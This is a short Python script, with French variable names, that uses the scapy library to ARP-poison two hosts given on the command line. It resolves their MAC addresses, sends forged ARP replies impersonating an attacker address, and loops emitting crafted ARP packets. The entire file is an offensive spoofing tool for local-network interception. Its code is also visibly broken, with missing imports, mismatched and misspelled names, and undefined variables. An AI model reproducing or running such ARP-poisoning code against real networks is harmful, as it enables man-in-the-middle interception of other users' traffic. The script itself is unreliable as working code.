#!/usr/bin/env python3
from scapy.all import ARP,Ether,sendp, hexdump, sr1 
import time as t
import sys 


import scapy.all
def recupip(ip1, ip2):
    ipcible = [ip1, ip2]
    for i in ipcible:
      arpmsg = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=i)
      reponse = srp(arpmsg, timeout=2)
      print(response[0][0][1].hswrc)
      resultat.append(response[0][0][1].hswrc)
      return resultat

def poison(cible1, cible2, atk):
  cible = [cible1, cible2]
  mac = []
  mac = recupip(cible1, cible2)
  for i in range(2):
    paquet = ARP(op=2, pdst=cible[i],hwdst=mac[i], psrc=atk)
    send(paquet, verbose=False)
  

def arp(ipa ,ipb):
    paqueta = Ether()/ARP(pdst=ipb)
    sr1(paqueta)
    while True:
        paqueta = Ether(dst)/ARP(psrc=ipa, pdst=ipb)
        # paquetb = Ether()/ARP(src=ipb, dst=ipa)
        # sendp(paqueta)
        # sendp(paquetb)
        hexdump(paqueta)
        t.sleep(10)
ipa = sys.argv[1]  
ipb = sys.argv[2]
arp(ipa, ipb)